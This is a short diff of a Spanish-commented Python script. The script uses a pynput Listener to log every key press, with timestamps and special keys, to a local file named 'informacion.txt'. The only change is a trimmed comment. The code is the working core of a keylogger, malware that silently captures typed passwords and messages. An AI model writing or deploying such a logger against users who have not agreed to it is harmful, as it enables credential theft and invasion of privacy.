@@ -10,7 +10,7 @@ def registrar_tecla(tecla):
               archivo.write(f"[{timestamp}] - {tecla.char}\n")  
     except AttributeError:
         with open('informacion.txt', 'a') as archivo:
-            archivo.write(f"{tecla}\n")  # Guarda teclas especiales como Enter, Shift, etc.
+            archivo.write(f"{tecla}\n")  # Guarda teclas especiales como Enter, Shift,
 
 with Listener(on_press=registrar_tecla) as listener:
     listener.join()
